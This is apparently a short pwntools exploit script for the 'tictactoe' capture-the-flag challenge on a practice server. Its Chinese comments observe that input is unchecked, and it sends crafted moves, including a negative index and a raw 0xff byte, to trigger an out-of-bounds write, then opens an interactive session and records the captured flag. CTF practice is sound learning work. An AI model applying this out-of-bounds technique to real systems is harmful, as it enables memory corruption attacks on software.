#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
需要玩游戏通关
对输入的数字没有校验，可能产生越界？
"""


import re, sys, os.path as path
from pwn import *
from pwnlib import gdb


context(arch="i386", os="linux")

elf_name = path.join(path.dirname(path.abspath(__file__)), "tictactoe")
_, host, port = re.split("\s+", "nc hackme.inndy.tw 7714")

elf = ELF(elf_name)
libc = elf.libc

io, context.log_level = (remote(host, port), "info") if len(sys.argv) > 1 else (process(elf_name), "debug")


def main():
    io.sendlineafter("? ", "1")
    sleep(0.1)
    io.sendlineafter(": ", "9")
    sleep(0.1)
    io.sendline("\xff")
    sleep(0.1)
    io.sendlineafter(": ", "4")
    io.sendlineafter(": ", "-9")
    io.sendlineafter(": ", "8")
    io.interactive()


if __name__ == "__main__":
    main()

# FLAG{OOB write? it's too easy for a pwn challenage! Get a shell pls}
